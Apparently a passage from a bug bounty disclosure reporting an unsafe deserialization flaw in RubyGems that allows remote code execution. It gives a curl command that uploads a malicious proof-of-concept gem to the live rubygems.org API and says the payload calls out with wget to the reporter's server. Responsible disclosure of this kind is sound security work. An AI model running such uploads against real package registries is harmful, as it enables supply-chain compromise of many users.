A proof of concept, `poc.gem`, is attached. Run the exploit with the following command:
`cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- -H 'Authorization: █████' https://rubygems.org/api/v1/gems`

I ran the attached PoC twice. It just does a `wget` to my server.

Please let me know if I should clarify anything! Thanks for running this program.

**Summary (team):**

An unsafe object deserialization vulnerability was found in RubyGems. Unfortunately this vulnerability can be used as a way to escalate to a remote code execution exploit.

---
